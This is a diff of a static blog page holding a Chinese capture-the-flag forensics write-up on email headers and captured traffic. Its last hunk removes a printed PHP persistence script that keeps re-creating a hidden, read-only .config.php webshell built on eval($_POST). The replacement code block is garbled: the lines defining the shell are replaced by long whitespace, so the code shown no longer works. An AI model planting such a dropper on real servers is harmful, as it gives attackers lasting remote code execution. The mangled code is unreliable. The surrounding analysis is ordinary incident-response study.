@@ -434,7 +434,7 @@
         
         
         
-          57 分钟
+          56 分钟
         
       </span>
     
@@ -817,7 +817,7 @@
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072021183-f80ced46-c984-4ff4-9b52-e27fd0b99372.png" srcset="/img/loading.gif" lazyload></p>
 <p>这边把发件人收件人都写清楚了</p>
-<p>所以答案就是flag{<a href="mailto:&#49;&#57;&#x38;&#51;&#57;&#50;&#57;&#x32;&#50;&#51;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;">1983929223@qq.com</a>}</p>
+<p>所以答案就是flag{<a href="mailto:&#x31;&#57;&#56;&#x33;&#57;&#x32;&#57;&#x32;&#50;&#x33;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">1983929223@qq.com</a>}</p>
 <h2 id="任务六：提交发送邮件的IP"><a href="#任务六：提交发送邮件的IP" class="headerlink" title="任务六：提交发送邮件的IP"></a>任务六：提交发送邮件的IP</h2><!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072108103-d7cb52f4-0629-4171-b399-db2f3e627118.png" srcset="/img/loading.gif" lazyload></p>
 <!-- 这是一张图片，ocr 内容为： -->
@@ -1082,7 +1082,7 @@
 <p>最后我们在流75成功寻找到了不死马的写入</p>
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323086879-5313c8f5-45ae-4742-bf2f-8511124e3089.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>ignore_user_abort(true);<br>set_time_limit(0);<br><br>$shell_content = &#x27;&lt;?php @eval($_POST[&quot;4aad625950d058c24711560e5f8445b9&quot;]); ?&gt;&#x27;;<br>$shell_path = __DIR__ . &#x27;/.config.php&#x27;;<br><br>while (true) &#123;<br>    if (!file_exists($shell_path)) &#123;<br>        file_put_contents($shell_path, $shell_content);<br>        chmod($shell_path, 0444); <br>    &#125;<br>    sleep(5);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>                                                                                                                           ?&gt;&#x27;;<br>$shell_path = __DIR__ . &#x27;/.config.php&#x27;;<br><br>while (true) &#123;<br>    if (!file_exists($shell_path)) &#123;<br>        file_put_contents($shell_path, $shell_content);<br>        chmod($shell_path, 0444); <br>    &#125;<br>    sleep(5);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
 
 <p>ignore_user_abort(true)确保了不会因为访问中断而被中止</p>
 <p>set_time_limit(0)保证无限循环</p>
